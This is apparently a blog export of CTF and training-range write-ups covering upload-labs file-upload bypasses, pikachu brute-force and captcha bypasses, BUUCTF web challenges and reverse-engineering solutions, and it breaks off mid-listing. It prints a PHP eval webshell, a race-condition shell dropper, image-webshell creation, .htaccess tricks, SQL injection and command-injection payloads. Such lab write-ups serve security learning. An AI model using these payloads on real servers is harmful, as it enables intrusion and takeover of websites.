[{"title":"upload-labs(二)","path":"/2024/07/03/upload-labs-二/","content":"upload-labs靶场练习 Pass-10 结合上述思路，使用空格-点进行绕过（该方法只对7.1以下的PHP版本有用） 1$file_name = deldot($file_name);//删除文件名末尾的点 1$file_ext = trim($file_ext); //首尾去空 依次删去最后的点和空格，最后保留了一个.，所以可以绕过 Pass-11 1$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这句代码会将黑名单中的内容替换为空，可以用双写进行绕过 即利用.pphphp，会将中间的php置为空得到.php Pass-12使用条件： php版本小于5.3.4 php的magic_quotes_gpc为OFF状态 这里是get00截断，直接在路径后面加上%00就行 上传成功 Pass-13和上一关不同的是这里是post00传参 需要在路径后面使用占位符，然后在hex中改成00 上传成功 Pass-14用下面命令生成图片🐎，直接传图片🐎就行了，注意命令只能在cmd中运行。 copy text.jpg /b + shell.php /a shell.jpg 文件包含执行shell http://127.0.0.1/upload-labs/include.php?file=upload/4920240703230122.jpg Pass-15直接用上一关的图片🐎也能上传 源码中多了一句 getimagesize()函数将测定任何GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM或WBMP图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通HTML文件中标记中的 height&#x2F;width 文本字符串。 Pass-16 exif_imagetype()读取一个图像的第一个字节并检查其后缀名。返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。 依然使用之前的图片马进行上传 Pass-17查看源代码，我们会发现会对上传的图片进行二次渲染 还是用之前的图片马进行测试 上传后将图片下载下来，我们可以发现一句话木马没了 这里改用gif进行上传，由于前面这段没咋变，所以考虑写在前面 Pass-18 条件竞争 &lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#39;); ?&gt; 上传这个php，抓包，不停发送 然后不停访问我们上传的php 在文件夹中发现shell.php，成功"},{"title":"upload-labs(一)","path":"/2024/07/02/upload-labs-一/","content":"uploads-labs靶场练习 Pass-01先传个一句话木马 提示 弹窗速度很快，猜测验证代码在前端 禁用js或者在控制台修改函数逻辑绕过 上传成功 Pass-02 提示文件类型不对，抓包修改文件类型即可 上传成功 Pass-03限制了后缀名 用php3进行绕过 上传成功 Pass-04 查看源码可以看到过滤了”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.ini”的后缀 通过上传.htaccess文件将jpg解析成php AddHandler php5-script .jpg AddType application/x-httpd-php .jpg Sethandler application/x-httpd-php Pass-05查看源码发现htaccess也被过滤了 利用.user.ini进行绕过 作用同.htaccess一样。auto_append_file=shell.txt .user.ini文件介绍.user.ini 文件是PHP的配置文件，用于自定义PHP的配置选项。该文件通常位于PHP安装目录的根目录下，或者在特定的网站目录下。用于覆盖或追加全局配置文件（如：php.ini）中的php配置选项。 注：这个绕过方式前提是上传目录下要有可执行的php文件。 .user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。注：phpstudy使用非nts版本，且版本使用7.几的，若使用5.几版本读取readme.php文件时会显示乱码 但我的phpstudy没有php7 非nts版本的 没测成功 Pass-06查看源码发现htaccess和ini都被过滤了 观察过滤的后缀名可以发现有小写，大小写混写，没有大写的 所以用大写后缀绕过即可 Pass-07对比源码可以发现少了 1$file_ext = trim($file_ext); //首尾去空 在windows环境下，系统会自动去除我们文件名后面的点和空格，但是在linux下并不会，linux环境下会保留我们文件名的特殊字符 因此我们可以通过在文件后缀名尾添加空格来绕过 Pass-08源码少了 1$file_name = deldot($file_name);//删除文件名末尾的点 原理同上 Pass-09源码少了 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉"},{"title":"token防爆破?","path":"/2024/06/30/token防爆破/","content":"pikachu靶场练习 抓包，会发现每下一次的token都藏在返回包里面 爆破 注意只能设置成单线程，不然token就乱套了 拿到用户密码"},{"title":"验证码绕过(on client)","path":"/2024/06/30/验证码绕过-on-client/","content":"pikachu靶场练习 验证码的验证在前端 直接禁用js或者输入正确验证码后抓包，就能直接爆破"},{"title":"验证码绕过(on server)","path":"/2024/06/30/验证码绕过-on-server/","content":"pikachu靶场练习 抓包发现提示 回显为 使用之前爆破出来的用户名密码重新send，发现用过了验证码，只要不刷新验证码就不会变，可以直接爆破，然后登录成功"},{"title":"基于表单的暴力破解","path":"/2024/06/30/基于表单的暴力破解/","content":"Pikachu靶场练习 抓包后进行弱口令爆破 从网上下个用户名字典和密码字典 https://www.cnblogs.com/liang-chen/p/13410517.html 他给的太大了，我就截取了前200个进行爆破 爆破出三组用户名和密码，均能成功登录 burpsuite口令爆破的四种模式"},{"title":"web学习1","path":"/2024/06/26/web学习1/","content":"web初学小白，呜呜呜 [极客大挑战 2019]EasySQLselect * from user where username&#x3D;’1” or 1&#x3D;1’ and password&#x3D;’1” or 1&#x3D;1’ 万能密码1’ or 1&#x3D;1# [极客大挑战 2019]Havefunget传参 [HCTF 2018]WarmUpphp代码审计 构造payload?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg，拿到flag [ACTF2020 新生赛]Include利用php:&#x2F;&#x2F;filter伪协议进行文件包含 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php [ACTF2020 新生赛]Exec;分隔命令，目录穿越拿到flag 127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag [GXYCTF2019]Ping Ping Ping绕过空格 $IFS ${IFS} $IFS$1 &#x2F;&#x2F;1可以换成任意数字 &lt; &lt;&gt; 将 flag 中的 g 赋值给变量 a，在命令行中用 fla$a 来表示 flag，构造的payload如下：、 &#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php 通过内联执行，让 ls 作为cat的参数传入，即可绕过flag： 内联执行：即一个命令的结果作为另一个命令的参数使用 &#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1`ls` flag在源码中"},{"title":"DASCTF-HDCTF2024 WP","path":"/2024/06/22/DASCTF-HDCTF2024-WP/","content":"baby_rop直接动调，主要代码都在debug003段 先校验长度，rdi存放了输入的长度 观察汇编容易看出，rdi和rsi，rand()异或 异或后如果rdi的值如果为0，zf被置为1，cmovz指令后rdi就会被置为1。 否则将会exit 因此获取rsi和rand()的值异或0x025649DA8^0x025649D88&#x3D;0x20 长度为0x20 重新输入后继续跟，跟到加密逻辑 观察到加密逻辑为先异或key然后加上key 然后又回到这里检验 因为是8个字节加密，直接手动取出每一组rsi和rand()的值，解密拿到flag 123456import libnumkey=0x343230324E494448enc=[0x9A7BA6984AB8636B,0x8F739F7345DC15CF,0x399F7938C150EA1A,0x7D454145674F5DD5]rd=[0x011DB2A3F,0x030836D0F,0x00AD48145,0x01ECB02BB]for i in range(len(enc)): print(libnum.n2s((((enc[i]^rd[i])-key)^key)&amp;0xffffffffffffffff).decode()[::-1],end=&quot;&quot;) FinalEncrypt程序自带加密，找到key就行 在代码中可以看出key和时间关联 属性里面找到时间 动调，修改seed的值 运行拿到key 解密 同理解密flag.md.enc 接着分析Encryption 主要用随机数生成了一个v8，然后就是换表加密 将代码粘贴出，用来生成v8 rand.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&quot;defs.h&quot;int main()&#123;\tunsigned int v3; // eax\tchar Str[8]; // [rsp+20h] [rbp-60h] BYREF\tchar v6[56]; // [rsp+28h] [rbp-58h] BYREF\tint v7; // [rsp+60h] [rbp-20h]\tunsigned char v8[260]; // [rsp+70h] [rbp-10h] BYREF\tint v9; // [rsp+174h] [rbp+F4h]\tint v10; // [rsp+178h] [rbp+F8h]\tint v11; // [rsp+17Ch] [rbp+FCh]\tint v12; // [rsp+180h] [rbp+100h]\tint v13; // [rsp+184h] [rbp+104h]\tint v14; // [rsp+188h] [rbp+108h]\tint v15; // [rsp+18Ch] [rbp+10Ch]\tint v16; // [rsp+190h] [rbp+110h]\tchar v17; // [rsp+195h] [rbp+115h]\tchar v18; // [rsp+196h] [rbp+116h]\tchar v19; // [rsp+197h] [rbp+117h]\tint i; // [rsp+198h] [rbp+118h]\tunsigned __int8 v21; // [rsp+19Ch] [rbp+11Ch]\tchar v22; // [rsp+19Dh] [rbp+11Dh]\tchar v23; // [rsp+19Eh] [rbp+11Eh]\tchar v24; // [rsp+19Fh] [rbp+11Fh]\tscanf(&quot;%d&quot;,&amp;v3);\tsrand(v3);\tdo v19 = rand();\twhile ( !v19 );\tmemset(v8, 0, 0x100);\tv8[0] = v19;\tv22 = 1;\tv21 = 1;\tdo\t&#123; if ( v22 &lt; 0 ) v24 = 27; else v24 = 0; v22 ^= v24 ^ (2 * v22); v18 = (2 * v21) ^ (4 * ((2 * v21) ^ v21)) ^ v21; v17 = v18 ^ (16 * v18); if ( v17 &lt; 0 ) v23 = 9; else v23 = 0; v21 = v23 ^ v17; v16 = (unsigned __int8)(v23 ^ v17); v16 = __ROR1__(v23 ^ v17, 7); v15 = v16 ^ (unsigned __int8)(v21 ^ v8[0]); v14 = v21; v14 = __ROR1__(v21, 6); v13 = v15 ^ v14; v12 = v21; v12 = __ROR1__(v21, 5); v11 = v13 ^ v12; v10 = v21; v10 = __ROR1__(v21, 4); v9 = v11 ^ v10; v8[v22] = v11 ^ v10;\t&#125;\twhile ( v22 != 1 );\tfor(int i=0;i&lt;256;i++) printf(&quot;%d,&quot;,v8[i]);&#125; 因为我c语言不好，所以用的python的subprocess和rand交互拿到v8，然后用python解密 1234567891011121314151617import subprocessfrom tqdm import tqdmenc=list(bytes.fromhex(&#x27;&#x27;&#x27;e07816e1dba1da61536634bef2c3b6346d533cc3b6b834e3beb634c80264143c34e36400bb4daa6902ff643414e3b8344dff6634b8b66db6bbc33834143461ab147e04&#x27;&#x27;&#x27;))for i in tqdm(range(1715156519,-1,-1)): process = subprocess.Popen([&quot;rand.exe&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE) input_data = str(i) process.stdin.write(input_data.encode()) process.stdin.close() output = process.stdout.read() s=output.decode() v8=list(eval(s)) try: ind=[v8.index(i) for i in enc] print(bytes(ind)) break except: pass"},{"title":"春秋杯冬季赛2023 WP","path":"/2024/06/22/春秋杯冬季赛2023-WP/","content":"coos 这一段生成了密钥，直接取就行了 第一组opcode，0x39只进行了一点初始化操作，主要是后面的[0x4e,0x4f,0x50,0x49]*31。 还原算法0x4e进行了一些初始化后又一个opcode然后进行处理 跑出汇编 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254opcode0=[0x25,0x23,0x28,0x26,0x33]opcode1=[0x00000042, 0x00000000, 0x00000039, 0x00000000, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048, 0x00000049, 0x00000002, 0x00000011, 0x00000002, 0x00000043, 0x00000044, 0x00000001, 0x00000037, 0x0000000F, 0x00000045, 0x0000000C, 0x00000046, 0x00000002, 0x00000047, 0x00000048]opcode2=[0x00000042, 0x00000000, 0x00000039, 0x00000000, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037,0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001,0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A,0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049, 0x00000043,0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D, 0x00000049,0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C, 0x0000004D,0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B, 0x0000004C,0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001, 0x0000004B,0x0000004C, 0x0000004D, 0x00000049, 0x00000043, 0x0000004A, 0x00000001, 0x00000037, 0x00000001,0x0000004B, 0x0000004C, 0x0000004D]ip=0index=1opcode=opcode1while ip&lt;len(opcode): v2=opcode[ip] if v2==0x1: print(&quot;mov eax,ebx&quot;) ip+=1 elif v2==0x2: print(&quot;mov eax,ecx&quot;) ip += 1 elif v2==0x3: print(&quot;mov eax,edx&quot;) ip += 1 elif v2==0x4: print(&quot;mov ebx,eax&quot;) ip += 1 elif v2==0x5: print(&quot;mov ebx,ecx&quot;) ip += 1 elif v2==0x6: print(&quot;mov ebx,edx&quot;) ip += 1 elif v2==0x7: print(&quot;mov ecx,eax&quot;) ip += 1 elif v2==0x8: print(&quot;mov ecx,ebx&quot;) ip += 1 elif v2==0x9: print(&quot;mov ecx,edx&quot;) ip += 1 elif v2==0xa: print(&quot;mov edx,eax&quot;) ip += 1 elif v2==0xb: print(&quot;mov edx,ebx&quot;) ip += 1 elif v2==0xc: print(&quot;mov edx,ecx&quot;) ip += 1 elif v2==0xe: ip += 1 elif v2==0xf: ip += 1 elif v2==0xd: v10=opcode[ip+1] print(&quot;mov edx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x10: print(&quot;push ebx&quot;) ip += 1 elif v2==0x11: v10=opcode[ip+1] print(&quot;shl eax,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x12: print(&quot;pop ecx&quot;) ip += 1 elif v2==0x13: ip += 1 elif v2==0x14: v10=opcode[ip+1] print(&quot;shr ebx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x15: print(&quot;pop edx&quot;) ip += 1 elif v2==0x16: ip += 1 elif v2==0x17: ip += 1 elif v2==0x18: print(&quot;add eax,ecx&quot;) ip += 1 elif v2==0x1C or v2==0x19: print(&quot;push eax&quot;) ip += 1 elif v2==0x1E or v2==0x1a: v10=opcode[ip+1] print(&quot;shr eax,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x1b: ip += 1 elif v2==0x1d: ip += 1 elif v2==0x1f: ip += 1 elif v2==0x20: ip += 1 elif v2==0x21: ip += 1 elif v2==0x22: print(&quot;return&quot;) ip += 1 elif v2 == 0x23: print(&quot;pop ebx&quot;) ip += 1 elif v2 == 0x24: print(&quot;add ebx,eax&quot;) ip += 1 elif v2 == 0x25: print(&quot;pop eax&quot;) ip += 1 elif v2==0x26: v10=opcode[ip+1] print(&quot;xor eax,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2 == 0x27: print(&quot;push ecx&quot;) ip += 1 elif v2 == 0x28: print(&quot;xor eax,ebx&quot;) ip += 1 elif v2==0x29: v10=opcode[ip+1] print(&quot;xor ebx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2 == 0x2A: print(&quot;add ebx,ecx&quot;) ip += 1 elif v2 == 0x2B: print(&quot;xor ebx,ecx&quot;) ip += 1 elif v2 == 0x2c: ip += 2 elif v2 == 0x2d: print(&quot;add eax,ebx&quot;) ip += 1 elif v2 == 0x2f: ip += 2 elif v2 == 0x30: print(&quot;judge&quot;) ip += 1 elif v2 == 0x31: ip += 2 elif v2 == 0x32: ip += 1 elif v2 == 0x33: ip += 2 elif v2 == 0x34: ip += 1 elif v2 == 0x35: ip += 1 elif v2 == 0x36: ip += 1 elif v2==0x37: v10 = opcode[ip + 1] print(&quot;and eax,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2 == 0x38: ip += 1 elif v2==0x39: v10 = opcode[ip + 1] print(&quot;mov ecx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x3a: v10 = opcode[ip + 1] print(&quot;mov ebx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2 == 0x3b: ip += 1 elif v2 == 0x3c: ip += 1 elif v2 == 0x3d: print(&quot;shl qword,eax&quot;) ip += 1 elif v2 == 0x3e: ip += 2 elif v2 == 0x3f: ip += 1 elif v2 == 0x40: ip += 1 elif v2 == 0x41: ip += 2 elif v2==0x42: v10=opcode[ip+1] print(&quot;mov dword,&#123;&#125;&quot;.format(v10)) ip+=2 elif v2==0x43: print(&quot;mov ebx,enc&quot;) ip += 1 elif v2==0x44: print(&quot;shr ebx,eax&quot;) ip+=1 elif v2==0x45: print(&quot;mov eb_x,dword_F6E000[2 * ea_x]&quot;) ip+=1 elif v2==0x46: v10 = opcode[ip + 1] print(&quot;shl edx,&#123;&#125;&quot;.format(v10)) ip += 2 elif v2==0x47: print(&quot;shr ebx,edx&quot;) ip+=1 elif v2==0x48: print(&quot;add result,ebx&quot;) ip+=1 elif v2==0x49: print(&quot;inc ecx&quot;) print(&quot;--------------------&quot;+str(index)) index+=1 ip+=1 elif v2 == 0x4a: print(&quot;shr ebx,ecx&quot;) ip += 1 elif v2 == 0x4b: print(&quot;mov ebx,dword_F6E080[2 * ecx]&quot;) ip += 1 elif v2 == 0x4c: print(&quot;shl eax,ebx&quot;) ip += 1 elif v2 == 0x4d: print(&quot;add result,eax&quot;) ip += 1 else: ip+=1pop eaxpop ebxxor eax,ebxxor eax,51 eax和ebx是前面传进来的密文和密钥 只是先将密文和密钥异或后异或了个0x33 0x4f 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208mov dword,0mov ecx,0mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------1mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------2mov eax,ecxshl eax,2mov ebx,encshr 